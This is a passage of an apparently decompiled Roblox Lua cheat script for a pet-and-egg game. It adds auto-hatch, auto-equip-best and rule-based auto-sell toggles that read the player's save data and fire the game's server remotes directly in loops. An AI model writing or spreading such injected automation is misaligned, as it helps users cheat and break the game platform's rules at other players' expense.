if not (n22 >= n19 or v23 ~= n21 or not fn43()) then
local AskHatch, v26 = fn40("RF/EggWorld/AskHatch", v25)
if AskHatch and v26 ~= false then
task.wait(0.35)
fn40("RF/EggWorld/AskFinishHatch", v25)
n22 += 1
tbl37[v25] = nil
else
tbl37[v25] = os.clock() + n20
end
task.wait(0.2)
continue
end
break
end
return n22 > 0
end
tbl3.Add(function()
if not fn43() or flag3 then
return false
end
flag3 = true
task.spawn(function()
pcall(fn44)
flag3 = false
end)
return false
end)
local function hatch()
n21 += 1
table.clear(tbl37)
tbl3.Wake()
end
v22 = v12:CreateToggle({ Name = "Auto Hatch", Default = false, Callback = hatch })
v12:CreateDropdown({
Name = "Hatch Min Rarity",
Note = "Hatch eggs of the chosen rarity and every rarity above it",
Options = tbl13,
Default = tbl13[1],
SubOf = v22,
Callback = function(arg)
tbl38.MinRarity = tbl14[arg] or 0
hatch()
end,
})
local tbl39 = {
["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
}
local tbl40 = { Slider = nil, Value = 0, Unit = "M/s" }
local function fn45(arg, arg2)
if arg ~= nil then
tbl40.Value = math.max(0, math.floor(tonumber(arg) or tbl40.Value))
end
if arg2 ~= nil then
tbl40.Unit = tostring(arg2)
end
tbl38.MinIncome = tbl40.Value * (tbl39[tbl40.Unit] or tbl39["M/s"]).Mult
hatch()
end
tbl40.Slider = fn5(v12, {
Name = "Min Hatch Value",
Note = "Skip eggs worth less than this (0 = off)",
SubOf = v22,
Legacy = "Hatch Min Value",
SectionName = "Auto Hatch & Equip",
OnRaw = function(arg)
fn45(math.floor(arg / 1000), "K/s")
end,
})
local tbl41 = {}
local tbl42 = {}
local directory = tbl.Assets and tbl.Assets.Directory
local n22 = 0
while (type(directory) ~= "table" or next(directory) == nil) and n22 < 2 do
n22 += task.wait(0.1)
if type(tbl.Assets) ~= "table" then
tbl.Assets = fn2(function()
return ReplicatedStorage.Data.Assets
end)
end
directory = tbl.Assets and tbl.Assets.Directory
end
local tbl43 = {}
if type(directory) == "table" then
for k, v23 in pairs(directory) do
local rarity = type(v23) == "table" and v23.Rarity or nil
local flag4 = type(rarity) == "table"
if flag4 then
flag4 = tonumber(rarity.RarityNumber or rarity.Rank)
end
local v24 = flag4 or nil
if v24 then
table.insert(tbl43, {
Category = tostring(k),
Name = tostring(v23.DisplayName or k),
Rarity = v24,
RarityName = tostring(rarity.DisplayName or rarity._id or v24),
})
end
end
end
table.sort(tbl43, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity > arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v23 in ipairs(tbl43) do
local str4 = string.format("%s [%s]", v23.Name, v23.RarityName)
if tbl42[str4] then
str4 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
end
table.insert(tbl41, str4)
tbl42[str4] = v23.Category
end
if #tbl41 > 0 then
fn6(v12:CreateMultiDropdown({
Name = "Hatch Specific Eggs",
Note = "Only hatch these eggs (empty = all)",
Options = tbl41,
Default = {},
SubOf = v22,
Callback = function(arg)
local eggs = {}
if type(arg) == "table" then
for k, v23 in pairs(arg) do
k = v23 == true and type(k) == "string" and k or type(v23) == "string" and v23 or nil
if k and tbl42[k] then
eggs[tbl42[k]] = true
end
end
end
tbl38.Eggs = eggs
hatch()
end,
}))
end
tbl4.Rift.Restart.Hatch = hatch
end
do
local n19 = 5
local n20 = 30
local v22 = nil
local flag3 = false
local n21 = 0
local tbl37 = {}
local n22 = 0
local flag4 = true
local v23 = nil
local n23 = -math.huge
local function fn40(arg)
local v24 = fn2(function()
return ReplicatedStorage.Data.Bases
end)
if type(v24) == "table" and type(v24.GetAssetEquipCapacity) == "function" then
local ok, result = pcall(v24.GetAssetEquipCapacity, arg and tonumber(arg.BaseUpgradeLevel) or 0)
if ok and tonumber(result) then
return math.floor(tonumber(result))
end
end
if v23 and os.clock() - n23 < n20 then
return v23
end
local rfPenRosterAskWearLimit = networking:FindFirstChild("RF/PenRoster/AskWearLimit")
if rfPenRosterAskWearLimit and rfPenRosterAskWearLimit:IsA("RemoteFunction") then
local ok, result = pcall(rfPenRosterAskWearLimit.InvokeServer, rfPenRosterAskWearLimit)
if ok and tonumber(result) then
local n24 = math.floor(tonumber(result))
local now = os.clock()
v23 = n24
n23 = now
return v23
end
end
return v23 or 0
end
local function fn41(arg)
local directory = tbl.Assets and tbl.Assets.Directory
local flag5 = type(directory) == "table" and directory[tostring(arg.Category)] or nil
local n24 = type(flag5) == "table" and tonumber(flag5.EarningRate) or 0
local n25 = tonumber(arg.Scale) or 0
if n24 <= 0 or n25 <= 0 then
return 0
end
local n26 = n25 > 5 and (n25 / 5) ^ 1.2 * 19.637875755794113 or n25 ^ 1.85
local mutations = tbl.Mutations
local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n27 = 1
if flag6 then
local ok, result = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
local flag7 = ok and type(result) == "number"
local n28 = 1
if flag7 then
n27 = result
else
n27 = n28
end
end
return n24 * n26 * n27
end
local function fn42()
local save3 = tbl.Save
local flag5 = type(save3) == "table" and type(save3.Get) == "function"
local flag6 = nil
if flag5 then
local ok, result = pcall(save3.Get)
flag6 = ok and type(result) == "table" and result or nil
end
if not flag6 then
return nil
end
local tbl38 = {}
local tbl39 = {}
local v24 = pairs
local equippedAssets = flag6.EquippedAssets or {}
for _, equippedAsset in v24(equippedAssets) do
if type(equippedAsset) == "string" then
tbl38[equippedAsset] = true
table.insert(tbl39, equippedAsset)
end
end
local tbl40 = {}
local v25 = pairs
local inventory = flag6.Inventory or {}
for k, v26 in v25(inventory) do
if type(v26) == "table" and v26.InFuse ~= true then
table.insert(tbl40, { Uid = k, Income = fn41(v26), Equipped = tbl38[k] == true })
end
end
table.sort(tbl40, function(arg, arg2)
if arg.Income ~= arg2.Income then
return arg.Income > arg2.Income
end
return tostring(arg.Uid) < tostring(arg2.Uid)
end)
return tbl40, tbl38, #tbl39, flag6
end
local function fn43(arg, arg2)
local tbl38 = {}
local flag5 = false
for i, v24 in ipairs(arg) do
if not (arg2 < i) then
if not v24.Equipped then
table.insert(tbl38, v24.Uid)
if not tbl37[v24.Uid] then
flag5 = true
end
end
continue
end
break
end
return tbl38, flag5
end
tbl3.Add(function()
if not tbl4.Toggle(v22, false) then
return false
end
local v24, v25, v26, v27 = fn42()
if v24 then
local v28 = fn40(v27)
local v29, v30 = fn43(v24, v28)
if (v30 or flag4) and not flag3 and os.clock() >= n22 then
for _, v31 in ipairs(v29) do
tbl37[v31] = true
end
flag4 = false
flag3 = true
n22 = os.clock() + n19
local v31 = n21
task.spawn(function()
local rfHaulFetchWearBestStatus = networking:FindFirstChild("RF/Haul/FetchWearBestStatus")
local isRemoteFunction = rfHaulFetchWearBestStatus and rfHaulFetchWearBestStatus:IsA("RemoteFunction")
local flag5 = true
if isRemoteFunction then
local ok, result = pcall(rfHaulFetchWearBestStatus.InvokeServer, rfHaulFetchWearBestStatus)
flag5 = ok and result ~= false and result ~= nil
end
local rfHaulWearBest = networking:FindFirstChild("RF/Haul/WearBest")
if flag5 and v31 == n21 and rfHaulWearBest and rfHaulWearBest:IsA("RemoteFunction") then
pcall(rfHaulWearBest.InvokeServer, rfHaulWearBest)
end
flag3 = false
tbl3.Wake()
end)
end
end
return false
end)
v22 = v12:CreateToggle({
Name = "Auto Equip Best",
Note = "Equip Best when a better pet appears",
Default = false,
Callback = function()
n21 += 1
table.clear(tbl37)
n22 = 0
flag4 = true
tbl3.Wake()
end,
})
local save3 = tbl.Save
if type(save3) == "table" and type(save3.FieldSignal) == "function" then
for _, v24 in ipairs({ "Inventory", "EquippedAssets" }) do
local ok, result = pcall(save3.FieldSignal, v24)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
flag4 = true
tbl3.Wake()
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
end
local n19
n19 = 3
local n20
n20 = 50
local tbl37
tbl37 = { "Rarity Only", "Value Only", "Rarity And Value", "Rarity Or Value" }
local tbl38, tbl39, tbl40, tbl41, fn40, v22
do
local v23 = fn2(function()
return ReplicatedStorage.Shared.Util.AssetItems
end)
tbl38 = {}
tbl39 = {}
tbl40 = {}
tbl41 = {}
local directory = tbl.Assets and tbl.Assets.Directory
local tbl42 = {}
local tbl43 = {}
if type(directory) == "table" then
for k, v24 in pairs(directory) do
local rarity = type(v24) == "table" and v24.Rarity or nil
local flag3 = type(rarity) == "table"
if flag3 then
flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
end
local v25 = flag3 or nil
if v25 then
local str4 = tostring(rarity.DisplayName or rarity._id or v25)
tbl42[v25] = tbl42[v25] or str4
table.insert(tbl43, {
Category = tostring(k),
Name = tostring(v24.DisplayName or k),
Rarity = v25,
RarityName = str4,
})
end
end
end
local tbl44 = {}
for k in pairs(tbl42) do
table.insert(tbl44, k)
end
table.sort(tbl44)
for _, v24 in ipairs(tbl44) do
local str4 = string.format("%d - %s", v24, tbl42[v24])
table.insert(tbl38, str4)
tbl39[str4] = v24
end
table.sort(tbl43, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity < arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v24 in ipairs(tbl43) do
local str4 = string.format("%s [%s]", v24.Name, v24.RarityName)
if tbl41[str4] then
str4 = string.format("%s [%s] (%s)", v24.Name, v24.RarityName, v24.Category)
end
table.insert(tbl40, str4)
tbl41[str4] = v24.Category
end
fn40 = function(arg)
for _, v24 in ipairs(tbl38) do
if tbl39[v24] == arg then
return v24
end
end
return tbl38[1]
end
local v24 = nil
v22 = nil
local v25 = nil
local v26 = nil
local v27 = tbl37[3]
local n21 = 3
local n22 = 0
local flag3 = true
local tbl45 = {}
local v28 = tbl37[3]
local n23 = 3
local n24 = 0
local flag4 = true
local tbl46 = {}
local flag5 = false
local n25 = 0
local function fn41(arg)
local n26 = tonumber(arg) or 0
local tbl47 = { "", "K", "M", "B", "T", "Qa", "Qi" }
local n27 = 1
while math.abs(n26) >= 1000 and n27 < #tbl47 do
n26 /= 1000
n27 += 1
end
return string.format(n27 == 1 and "$%.0f%s" or "$%.2f%s", n26, tbl47[n27])
end
local function fn42(arg, arg2)
local tbl47 = {}
if type(arg) == "table" then
for k, v29 in pairs(arg) do
k = v29 == true and type(k) == "string" and k or type(v29) == "string" and v29 or nil
if k then
tbl47[arg2 and arg2[k] or k] = true
end
end
end
return tbl47
end
local function fn43(arg)
local directory2 = tbl.Assets and tbl.Assets.Directory
local flag6 = type(directory2) == "table" and directory2[tostring(arg)] or nil
local rarity = type(flag6) == "table" and flag6.Rarity or nil
local flag7 = type(rarity) == "table"
if flag7 then
flag7 = tonumber(rarity.RarityNumber or rarity.Rank)
end
return flag7 or math.huge
end
local function fn44(arg)
local directory2 = tbl.Assets and tbl.Assets.Directory
local flag6 = type(directory2) == "table" and directory2[tostring(arg.Category)] or nil
local n26 = type(flag6) == "table" and tonumber(flag6.EarningRate) or 0
local n27 = tonumber(arg.Scale) or 0
if n26 <= 0 or n27 <= 0 then
return 0
end
local n28 = n27 > 5 and (n27 / 5) ^ 1.2 * 19.637875755794113 or n27 ^ 1.85
local mutations = tbl.Mutations
local flag7 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n29 = 1
if flag7 then
local ok
ok, n29 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
local flag8 = ok and type(n29) == "number"
local n30 = 1
if not flag8 then
n29 = n30
end
end
return n26 * n28 * n29
end
local function fn45(arg)
return type(arg) == "table" and next(arg) ~= nil
end
local function fn46()
local save3 = tbl.Save
if type(save3) ~= "table" or type(save3.Get) ~= "function" then
return nil
end
local ok, result = pcall(save3.Get)
return ok and type(result) == "table" and result or nil
end
local function fn47()
local v29 = fn46()
local tbl47 = {}
if not v29 then
return tbl47, 0
end
local tbl48 = {}
local v30 = pairs
local equippedAssets = v29.EquippedAssets or {}
for _, equippedAsset in v30(equippedAssets) do
tbl48[equippedAsset] = true
end
local v31 = pairs
local inventory = v29.Inventory or {}
local n26 = 0
for k, v32 in v31(inventory) do
local flag6 = type(v32) == "table" and v32.InFuse ~= true and v32.IsFavorite ~= true and not tbl48[k] and not tbl45[tostring(v32.Category)]
if flag6 then
flag6 = not (flag3 and fn45(v32.Mutations))
end
if flag6 then
local v33 = fn44(v32)
local flag7 = fn43(v32.Category) <= n21
local flag8 = n22 > 0 and v33 < n22
if v27 ~= tbl37[2] then
if v27 == tbl37[3] then
flag8 = flag7 and flag8
elseif v27 ~= tbl37[4] then
flag8 = flag7
else
flag8 = flag7 or flag8
end
end
if flag8 then
table.insert(tbl47, k)
local flag9 = type(v23) == "table" and type(v23.SalePrice) == "function"
local flag10 = false
local result = nil
if flag9 then
flag10, result = pcall(v23.SalePrice, v32)
end
n26 += flag10 and tonumber(result) or v33 * 100
end
end
end
return tbl47, n26
end
local function fn48()
local tbl47 = {}
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return tbl47, 0
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return tbl47, 0
end
local character = localPlayer.Character
character = character and character:FindFirstChildWhichIsA("Tool")
character = character and character:GetAttribute("UID") or nil
local eggRecords = tbl.EggRecords
local v29, v30, v31 = pairs(result)
local n26 = 0
for k, v32 in v29, v30, v31 do
local flag6 = type(v32) == "table" and v32.Placement == nil and k ~= character and not tbl4.Lab.Reserved[k]
if flag6 then
flag6 = not (v32.EggSkin ~= nil and tbl4.SellLab and tbl4.SellLab.Skins[tostring(v32.EggSkin)])
end
flag6 = flag6 and not tbl46[tostring(v32.AssetCategory)]
local flag7
if flag6 then
flag7 = not (flag4 and fn45(v32.Mutations))
else
flag7 = flag6
end
if flag7 then
local v33 = fn44({ Category = v32.AssetCategory, Scale = v32.AssetScale, Mutations = v32.Mutations })
local flag8 = fn43(v32.AssetCategory) <= n23
local flag9 = n24 > 0 and v33 < n24
local v34
if v28 == tbl37[2] then
v34 = flag9
elseif v28 == tbl37[3] then
v34 = flag8 and flag9
elseif v28 ~= tbl37[4] then
v34 = flag8
else
v34 = flag8 or flag9
end
if v34 then
table.insert(tbl47, k)
if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
local ok2, result2 = pcall(eggRecords.SellPrice, v32)
n26 += ok2 and tonumber(result2) or 0
end
end
end
end
return tbl47, n26
end
local function fn49(arg, arg2)
local rePetSatchelSellSelection = networking:FindFirstChild("RE/PetSatchel/SellSelection")
if not rePetSatchelSellSelection or not rePetSatchelSellSelection:IsA("RemoteEvent") then
return false
end
local n26 = math.max(#arg, #arg2)
local n27 = 1
while n27 <= n26 do
local tbl47 = {}
local tbl48 = {}
for i = n27, n27 + n20 - 1 do
if arg[i] then
table.insert(tbl47, arg[i])
end
if arg2[i] then
table.insert(tbl48, arg2[i])
end
end
pcall(rePetSatchelSellSelection.FireServer, rePetSatchelSellSelection, { Eggs = tbl48, Assets = tbl47 })
n27 += n20
if n27 <= n26 then
task.wait(0.3)
end
end
return true
end
local function fn50(arg, arg2)
if flag5 or #arg == 0 and #arg2 == 0 then
return
end
flag5 = true
n25 = os.clock() + n19
task.spawn(function()
pcall(fn49, arg, arg2)
flag5 = false
tbl3.Wake()
end)
end
tbl3.Add(function()
local v29 = tbl4.Toggle(v24, false)
local v30 = tbl4.Toggle(v22, false)
local v31, v32 = fn47()
local v33, v34 = fn48()
if v25 and type(v25.Set) == "function" then
pcall(v25.Set, v25, string.format("Pet matches  -  %d pets for %s", #v31, fn41(v32)))
end
if v26 and type(v26.Set) == "function" then
pcall(v26.Set, v26, string.format("Egg matches  -  %d eggs for %s", #v33, fn41(v34)))
end
local v35 = flag5
local flag6
if flag5 then
flag6 = v35
else
flag6 = os.clock() < n25
end
if not flag6 then
flag6 = not (v29 or v30)
end
if flag6 then
return false
end
fn50(v29 and v31 or {}, v30 and v33 or {})
return false
end)
v25 = v13:CreateText({ Name = "Pet Sell Preview", Text = "Pet matches  -  0 pets" })
v24 = v13:CreateToggle({
Name = "Auto Sell Pet",
Default = false,
Callback = function()
tbl3.Wake()
end,
})
v13:CreateButton({
Name = "Sell Pets Now",
ButtonText = "Sell",
ConfirmText = "Sold!",
SubOf = v24,
Callback = function()
fn50(fn47(), {})
end,
})
v13:CreateDropdown({
Name = "Sell Pet Rule",
Note = "Which checks must pass to sell",
Options = tbl37,
Default = tbl37[3],
SubOf = v24,
Callback = function(arg)
if table.find(tbl37, arg) then
v27 = arg
tbl3.Wake()
end
end,
})
v13:CreateDropdown({
Name = "Pet Max Rarity",
Note = "Sell pets at or below this rarity",
Options = tbl38,
Default = fn40(3),
SubOf = v24,
Callback = function(arg)
n21 = tbl39[arg] or n21
tbl3.Wake()
end,
})
local tbl47 = {
["K/s"] = { Min = 0, Max = 1000, Mult = 1000 },
["M/s"] = { Min = 0, Max = 1000, Mult = 1000000 },
["B/s"] = { Min = 0, Max = 100, Mult = 1e9 },
}
local function fn51(arg, arg2, arg3, arg4)
local n26 = 0
local str4 = "M/s"
local function fn52(arg5, arg6)
if arg5 ~= nil then
n26 = math.max(0, math.floor(tonumber(arg5) or n26))
end
if arg6 ~= nil then
str4 = tostring(arg6)
end
arg4(n26 * (tbl47[str4] or tbl47["M/s"]).Mult)
tbl3.Wake()
end
return (fn5(v13, {
Name = arg == "Pet Value Threshold" and "Pet Sell Value" or arg == "Egg Value Threshold" and "Egg Sell Value" or arg,
Note = arg2,
SubOf = arg3,
Legacy = arg,
SectionName = "Auto Sell",
OnRaw = function(arg5)
fn52(math.floor(arg5 / 1000), "K/s")
end,
}))
end
fn51("Pet Value Threshold", "Sell pets worth less than this (0 = off)", v24, function(arg)
n22 = arg
end)
local v29 = nil
v29 = v13:CreateToggle({
Name = "Keep Mutated Pets",
Note = "Never sell mutated pets",
Default = true,
SubOf = v24,
Callback = function()
flag3 = tbl4.Toggle(v29, true)
tbl3.Wake()
end,
})
fn6(v13:CreateMultiDropdown({
Name = "Blacklist Sell Pets",
Note = "These pets are never sold",
Options = tbl40,
Default = {},
SubOf = v24,
Callback = function(arg)
tbl45 = fn42(arg, tbl41)
tbl3.Wake()
end,
}))
v26 = v13:CreateText({ Name = "Egg Sell Preview", Text = "Egg matches  -  0 eggs" })
v22 = v13:CreateToggle({
Name = "Auto Sell Egg",
Note = "Sell bag eggs matching the rules below",
Default = false,
Callback = function()
tbl3.Wake()
end,
})
v13:CreateButton({
Name = "Sell Eggs Now",
Note = "Sell matching eggs once",
ButtonText = "Sell",
ConfirmText = "Sold!",
SubOf = v22,
Callback = function()
local v30 = fn48()
fn50({}, v30)
end,
})
v13:CreateDropdown({
Name = "Sell Egg Rule",
Note = "Which checks must pass to sell",
Options = tbl37,
Default = tbl37[3],
SubOf = v22,
Callback = function(arg)
if table.find(tbl37, arg) then
v28 = arg
tbl3.Wake()
end
end,
})
v13:CreateDropdown({
Name = "Egg Max Rarity",
Note = "Sell eggs at or below this rarity",
Options = tbl38,
Default = fn40(3),
SubOf = v22,
Callback = function(arg)
n23 = tbl39[arg] or n23
tbl3.Wake()
end,
})
fn51("Egg Value Threshold", "Sell eggs worth less than this (0 = off)", v22, function(arg)
n24 = arg
end)
local v30 = nil
v30 = v13:CreateToggle({
Name = "Keep Mutated Eggs",
Note = "Never sell mutated eggs",
Default = true,
SubOf = v22,
Callback = function()
flag4 = tbl4.Toggle(v30, true)
tbl3.Wake()
end,
})
local function fn52()
local sellLabSection = tbl.SellLabSection
local sellLab = {
Skins = {},
Rule = tbl37[3],
MaxRarity = 0,
IncomeLimit = 0,
KeepMutated = true,
KeepPets = {},
Handle = nil,
Preview = nil,
}
tbl4.SellLab = sellLab
local tbl48 = {}
local tbl49 = {}
local tbl50 = {}
local tbl51 = {}
local ok, result = pcall(function()
return require(ReplicatedStorage.Data.ScrambleTradeIn)
end)
local banners = ok and type(result) == "table" and type(result.Banners) == "table" and result.Banners or {}
local tbl52 = {}
for _, banner in ipairs(banners) do
if type(banner) == "table" and banner.EggSkin ~= nil then
local str4 = tostring(banner.EggSkin)
sellLab.Skins[str4] = true
local str5 = tostring(banner.DisplayName or banner.Id or str4)
if tbl49[str5] then
str5 ..= " (" .. str4 .. ")"
end
tbl49[str5] = str4
table.insert(tbl48, str5)
local v31 = ipairs
local pets = type(banner.Pets) == "table" and banner.Pets or {}
for _, pet in v31(pets) do
local str6 = type(pet) == "table" and pet.AssetId ~= nil and tostring(pet.AssetId) or nil
if str6 and not tbl52[str6] then
tbl52[str6] = true
local directory2 = tbl.Assets and tbl.Assets.Directory
local flag6 = type(directory2) == "table" and directory2[str6] or nil
local flag7 = type(flag6) == "table"
if flag7 then
flag7 = tostring(flag6.DisplayName or str6)
end
flag7 = flag7 or str6
if tbl51[flag7] then
flag7 ..= " (" .. str6 .. ")"
end
tbl51[flag7] = str6
table.insert(tbl50, flag7)
end
end
end
end
table.sort(tbl50)
local function eggs()
local tbl53 = {}
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return tbl53, 0
end
local ok2, result2 = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok2 or type(result2) ~= "table" then
return tbl53, 0
end
local character = localPlayer.Character
local tool = character and character:FindFirstChildWhichIsA("Tool")
tool = tool and tool:GetAttribute("UID") or nil
local eggRecords = tbl.EggRecords
local v31, v32, v33 = pairs(result2)
local n26 = 0
for k, v34 in v31, v32, v33 do
local str4 = type(v34) == "table" and v34.EggSkin ~= nil and tostring(v34.EggSkin) or nil
str4 = str4 and sellLab.Skins[str4] and v34.Placement == nil and k ~= tool and not tbl4.Lab.Reserved[k] and not sellLab.KeepPets[tostring(v34.AssetCategory)]
if str4 then
str4 = not (sellLab.KeepMutated and fn45(v34.Mutations))
end
if str4 then
local v35 = fn44({ Category = v34.AssetCategory, Scale = v34.AssetScale, Mutations = v34.Mutations })
local maxRarity = sellLab.MaxRarity
local flag6 = fn43(v34.AssetCategory) <= maxRarity
local flag7 = sellLab.IncomeLimit > 0 and v35 < sellLab.IncomeLimit
if sellLab.Rule ~= tbl37[2] then
if sellLab.Rule == tbl37[3] then
flag7 = flag6 and flag7
elseif sellLab.Rule ~= tbl37[4] then
flag7 = flag6
else
flag7 = flag6 or flag7
end
end
if flag7 then
table.insert(tbl53, k)
if type(eggRecords) == "table" and type(eggRecords.SellPrice) == "function" then
local ok3, result3 = pcall(eggRecords.SellPrice, v34)
n26 += ok3 and tonumber(result3) or 0
end
end
end
end
return tbl53, n26
end
sellLab.Eggs = eggs
sellLab.Preview = sellLabSection:CreateText({ Name = "Lab Egg Sell Preview", Text = "Lab egg matches  -  0 eggs" })
sellLab.Handle = sellLabSection:CreateToggle({
Name = "Auto Sell Lab Egg",
Note = "Sell eggs traded from Dr Scramble that match the filters below",
Default = false,
Callback = function()
tbl3.Wake()
end,
})
sellLabSection:CreateButton({
Name = "Sell Lab Eggs Now",
Note = "Sell matching Lab eggs once",
ButtonText = "Sell",
ConfirmText = "Sold!",
SubOf = sellLab.Handle,
Callback = function()
local v31 = eggs()
fn50({}, v31)
end,
})
sellLabSection:CreateDropdown({
Name = "Sell Lab Egg Rule",
Note = "Which checks must pass to sell",
Options = tbl37,
Default = tbl37[3],
SubOf = sellLab.Handle,
Callback = function(rule)
if table.find(tbl37, rule) then
sellLab.Rule = rule
tbl3.Wake()
end
end,
})
local tbl53 = { "Off" }
for _, v31 in ipairs(tbl38) do
table.insert(tbl53, v31)
end
sellLabSection:CreateDropdown({
Name = "Lab Egg Max Rarity",
Note = "Sell Lab eggs at or below this rarity (Off = none by rarity)",
Options = tbl53,
Default = "Off",
SubOf = sellLab.Handle,
Callback = function(arg)
sellLab.MaxRarity = tbl39[arg] or 0
tbl3.Wake()
end,
})
fn5(sellLabSection, {
Name = "Lab Egg Sell Value",
Note = "Sell Lab eggs worth less than this (0 = off)",
SubOf = sellLab.Handle,
Legacy = "Lab Egg Value Threshold",
SectionName = "Auto Sell Lab Egg",
OnRaw = function(arg)
sellLab.IncomeLimit = math.max(0, tonumber(arg) or 0)
tbl3.Wake()
end,
})
local v31 = nil
v31 = sellLabSection:CreateToggle({
Name = "Keep Mutated Lab Eggs",
Note = "Never sell mutated Lab eggs",
Default = true,
SubOf = sellLab.Handle,
Callback = function()
sellLab.KeepMutated = tbl4.Toggle(v31, true)
tbl3.Wake()
end,
})
if #tbl50 > 0 then
fn6(sellLabSection:CreateMultiDropdown({
Name = "Keep Lab Pets",
Note = "Lab eggs of these pets are never sold",
Options = tbl50,
Default = {},
SubOf = sellLab.Handle,
Callback = function(arg)
sellLab.KeepPets = fn42(arg, tbl51)
tbl3.Wake()
end,
}))
end
tbl3.Add(function()
local v32, v33 = eggs()
if sellLab.Preview and type(sellLab.Preview.Set) == "function" then
pcall(sellLab.Preview.Set, sellLab.Preview, string.format("Lab egg matches  -  %d eggs for %s", #v32, fn41(v33)))
end
if flag5 or os.clock() < n25 or not tbl4.Toggle(sellLab.Handle, false) then
return false
end
fn50({}, v32)
return false
end)
end
fn52()
fn6(v13:CreateMultiDropdown({
Name = "Blacklist Sell Eggs",
Note = "These eggs are never sold",
Options = tbl40,
Default = {},
SubOf = v22,
Callback = function(arg)
tbl46 = fn42(arg, tbl41)
tbl3.Wake()
end,
}))
end
local save3 = tbl.Save
if type(save3) == "table" and type(save3.FieldSignal) == "function" then
for _, v23 in ipairs({ "Inventory", "EggInventory", "EquippedAssets" }) do
local ok, result = pcall(save3.FieldSignal, v23)
if ok and type(result) == "table" and type(result.Connect) == "function" then
local ok2, result2 = pcall(result.Connect, result, function()
tbl3.Wake()
end)
if ok2 and result2 then
fn4(function()
pcall(function()
result2:Disconnect()
end)
end)
end
end
end
end
local n21
n21 = 2
local n22
n22 = 3
local n23
n23 = 20
local tbl42
tbl42 = { "Lowest Rarity First", "Highest Rarity First", "Most Copies First", "Lowest Value First" }
local tbl43
tbl43 = { "Lowest To Highest", "Highest To Lowest" }
local tbl44
tbl44 = {}
local tbl45
tbl45 = {}
local tbl46
tbl46 = {}
local tbl47
tbl47 = {}
do
local directory = tbl.Assets and tbl.Assets.Directory
local tbl48 = {}
local tbl49 = {}
if type(directory) == "table" then
for k, v23 in pairs(directory) do
local rarity = type(v23) == "table" and v23.Rarity or nil
local flag3 = type(rarity) == "table"
if flag3 then
flag3 = tonumber(rarity.RarityNumber or rarity.Rank)
end
flag3 = flag3 or nil
if flag3 then
local str4 = tostring(rarity.DisplayName or rarity._id or flag3)
tbl48[flag3] = tbl48[flag3] or str4
table.insert(tbl49, {
Category = tostring(k),
Name = tostring(v23.DisplayName or k),
Rarity = flag3,
RarityName = str4,
})
end
end
end
local tbl50 = {}
for k in pairs(tbl48) do
table.insert(tbl50, k)
end
table.sort(tbl50)
for _, v23 in ipairs(tbl50) do
local str4 = string.format("%d - %s", v23, tbl48[v23])
table.insert(tbl44, str4)
tbl45[str4] = v23
end
table.sort(tbl49, function(arg, arg2)
if arg.Rarity ~= arg2.Rarity then
return arg.Rarity < arg2.Rarity
end
return arg.Name < arg2.Name
end)
for _, v23 in ipairs(tbl49) do
local str4 = string.format("%s [%s]", v23.Name, v23.RarityName)
if tbl47[str4] then
str4 = string.format("%s [%s] (%s)", v23.Name, v23.RarityName, v23.Category)
end
table.insert(tbl46, str4)
tbl47[str4] = v23.Category
end
end
local v23
do
local fn41, v24, v25, v26, n24, tbl48, flag3, flag4, flag5, n25
local n26, n27, tbl49, fn42, fn43, fn44, fn45, fn46, fn47
do
fn41 = function(arg)
for _, v27 in ipairs(tbl44) do
if tbl45[v27] == arg then
return v27
end
end
return tbl44[#tbl44]
end
v23 = nil
v24 = nil
v25 = tbl42[1]
v26 = tbl43[1]
n24 = 6
tbl48 = {}
flag3 = true
flag4 = true
flag5 = false
n25 = 0
n26 = 0
n27 = 0
tbl49 = {}
fn42 = function(arg, arg2)
local v27 = networking:FindFirstChild(arg)
if not v27 or not v27:IsA("RemoteFunction") then
return false, nil
end
if arg2 == nil then
return pcall(v27.InvokeServer, v27)
end
return pcall(v27.InvokeServer, v27, arg2)
end
fn43 = function()
local save4 = tbl.Save
if type(save4) ~= "table" or type(save4.Get) ~= "function" then
return nil
end
local ok, result = pcall(save4.Get)
return ok and type(result) == "table" and result or nil
end
local function fn48(arg)
local directory = tbl.Assets and tbl.Assets.Directory
return type(directory) == "table" and directory[tostring(arg)] or nil
end
local function fn49(arg)
local v27 = fn48(arg)
local rarity = type(v27) == "table" and v27.Rarity or nil
local flag6 = type(rarity) == "table"
if flag6 then
flag6 = tonumber(rarity.RarityNumber or rarity.Rank)
end
return flag6 or math.huge
end
fn44 = function(arg)
local v27 = fn48(arg)
return tostring(type(v27) == "table" and v27.DisplayName or arg)
end
local function fn50(arg)
local v27 = fn48(arg.Category)
local n28 = type(v27) == "table" and tonumber(v27.EarningRate) or 0
local n29 = tonumber(arg.Scale) or 0
if n28 <= 0 or n29 <= 0 then
return 0
end
local n30 = n29 > 5 and (n29 / 5) ^ 1.2 * 19.637875755794113 or n29 ^ 1.85
local mutations = tbl.Mutations
local flag6 = type(mutations) == "table" and type(mutations.EarningsFor) == "function"
local n31 = 1
if flag6 then
local ok
ok, n31 = pcall(mutations.EarningsFor, type(arg.Mutations) == "table" and arg.Mutations or {})
local flag7 = ok and type(n31) == "number"
local n32 = 1
if not flag7 then
n31 = n32
end
end
return n28 * n30 * n31
end
